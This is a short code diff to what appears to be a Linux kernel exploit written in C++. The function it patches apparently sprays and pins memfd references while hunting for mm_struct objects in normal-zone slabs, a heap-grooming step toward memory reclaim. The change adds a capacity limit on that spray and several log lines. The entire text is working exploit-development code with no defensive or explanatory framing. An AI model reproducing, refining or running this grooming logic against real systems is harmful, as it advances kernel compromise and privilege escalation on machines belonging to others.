@@ -666,6 +666,10 @@ bool a53_collect_full_group(std::size_t cpu_count, std::size_t mm_struct_sz, std
      * candidate for a while keeps it from being freed and recycled underneath
      * the hunt while we look for a normal-zone slab instead. */
     const size_t dma32_refs = kernel::A53_DMA32_SKIP_SLABS * batch;
+    /* Same capacity bound upstream uses. Without it a run that keeps landing on
+     * DMA32 pins refs unboundedly -- 256 attempts x 272 refs is 70k processes,
+     * which is enough to exhaust the process table and memory on its own. */
+    const size_t opaque_capacity = kernel::A53_PAGE_SCAN_MAX * batch;
     std::vector<int32_t> opaque;
     std::vector<uintptr_t> bases;
     std::vector<size_t> counts;
@@ -688,10 +692,19 @@ bool a53_collect_full_group(std::size_t cpu_count, std::size_t mm_struct_sz, std
         }
         if (!a53_valid_normal_mm(mm, mm_struct_sz, batch)) {
             /* DMA32, or a slot outside the slab: hold briefly, then drop. */
+            if (opaque.size() + dma32_refs > opaque_capacity) {
+                pr_warning("A53_DMA32_LIMIT attempt=%lu opaque=%zu cap=%zu\n",
+                        static_cast<unsigned long>(attempt), opaque.size(), opaque_capacity);
+                SYSCHK(close(fd));
+                break;
+            }
             SYSCHK(close(fd));
             for (size_t i = 1; i < dma32_refs; i++) {
                 opaque.push_back(clone_memfd());
             }
+            pr_info("A53_DMA32_SKIP attempt=%lu base=0x%016zx refs=%zu total=%zu\n",
+                    static_cast<unsigned long>(attempt), mm & ~(kernel::ORDER3_SIZE - 1), dma32_refs,
+                    opaque.size());
             hint = 0;
             continue;
         }
@@ -746,6 +759,8 @@ bool a53_collect_full_group(std::size_t cpu_count, std::size_t mm_struct_sz, std
         SYSCHK(close(fd));
     }
     if (chosen == a53_reclaim::kMaxGroups) {
+        pr_warning("A53_GROUP_NONE scan=%u groups=%zu opaque=%zu\n",
+                static_cast<unsigned>(kernel::A53_PAGE_SCAN_MAX), group_count, opaque.size());
         return false;
     }
 
